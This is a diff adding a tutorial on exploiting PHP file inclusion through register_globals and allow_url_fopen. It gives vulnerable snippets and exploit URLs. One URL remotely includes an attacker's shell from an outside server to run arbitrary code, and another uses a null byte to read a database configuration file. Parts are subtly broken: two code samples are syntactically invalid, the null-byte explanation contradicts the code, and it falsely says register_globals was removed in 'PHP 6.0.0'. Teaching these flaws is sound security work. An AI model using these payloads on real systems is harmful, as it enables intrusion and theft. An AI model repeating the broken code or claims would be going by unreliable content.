@@ -1,0 +1,79 @@
+What Is PHP File Inclusion?
+PHP File Inclusion is done by functions that are a part of PHP (such as include(), include_once()) and allows PHP to open other files for reading. In the case of using include(), the purpose is to reading a file containing PHP code to be interpreted [and output].(for example: we can include file that read important data from the database of the application, and then display directly on screen).
+
+php ex:
+<?php
+//
+// TorrentTrader v2.x
+//
+This file was last updated: 20/July/2007
+//
+//
+http://www.torrenttrader.org
+//
+//
+require_once("backend/functions.php");
+?>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+register_globals Importance to Exploiting File Inclusions
+---------------------------------------------------------
+What Is register_globals in PHP?
+--------------------------------
+register_globals was disabled by default since the release of PHP 4.2.0 and has been DEPRECATED as of PHP 5.3.0 and then was later removed with the release of PHP 6.0.0 for security reasons.
+
+What is register_globals? register_globals is on option in PHP (php.ini) that allowed global variables to be set with variables declared in a request (such as GET or POST).
+
+How can register_globals be misused?
+Simply, register_globals can be abused by an attacker by allowing an attacker to set any variable they wish (including request variables from HTML forms) in a request, which is exploitable if the variables are not initialised.
+
+php ex:
+<?php
+// /usercp/include/getfile.php
+if(!isset($FilePath))
+{
+	$FilePath = '/users/' . $_SESSION['Username'] . 'user.cfg';
+}
+include($FilePath);
+
+Vulnerable code example is shown above (if register_globals = on)
+
+Exploit: http://localhost/webApplication/usercp/include/getfile.php?$FilePath=[Local File Inclusion]
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+allow_url_fopen Importance to Remote File Inclusions:
+-----------------------------------------------------
+Disabled in Installations by default since PHP 5.2.0:
+-----------------------------------------------------
+allow_url_fopen is an option in PHP (php.ini) that allows functions such as fopen(), include(), require() (any function that has a URL aware wrapper) to read remote files over HTTP. To the attacker this simply means whether or not you can exploit a file inclusion and include a file on a remote server, rather than just local.
+If this option is enabled the attacker would be able to perform the following attack on the code above on this page:
+
+Exploitation Example:
+http://localhost/webApplication/usercp/include/getfile.php?$FilePath=http://server.com/toolz/attackershell.php
+(for example: from this code we can execute any code to read/modify/write the data in files/db/...etc).
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Exploiting Vulnerable Code:
+---------------------------
+What Could We Do With a File Inclusion Exploit?
+-----------------------------------------------
+When exploiting a file inclusion vulnerability, the first thing you might consider (not so much any more) is whether or not allow_url_fopen is enabled on the target server. If allow_url_fopen is enabled, it is more than likely you will be able to include a remote file containing PHP code, most likely a PHP Shell (everyone's favourite?). If this isn't the case because the administrator has disabled it or has left it disabled then only Local File Inclusion is possible. Any file that you have access to (depending on restrictions) can be read, including files that contain PHP locally and of course any PHP will be interpreted and executed.
+
+Example Vulnerable Code:
+<?php
+	//Example.php
+	if (isset($_GET['Language']))
+	{
+		$language = $_GET['Language'];
+		else
+		$language = 'default';
+	}
+
+	include('/configuration/' . $language . '.php');
+?>
+Exploitation of File Inclusion via Inclusion of Sensitive Information:
+Http://localhost/vulnerable_application/Example.php?Language=dbconfig.conf%00
+
+Here instead of reading the language files we read the configuration file, and here we show the importance of separate the configuration files of db, language, authentication, ...etc. (and also we can set different extensions for the configuration files: .lang.php, .auth.php, .db.php, ...etc).
+
+Why The NULL %00 CHAR?
+----------------------
+The NULL character is used so that the string Is truncated at the NULL character, since the point of injection is not the end of the string, and ".conf" is appended.
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
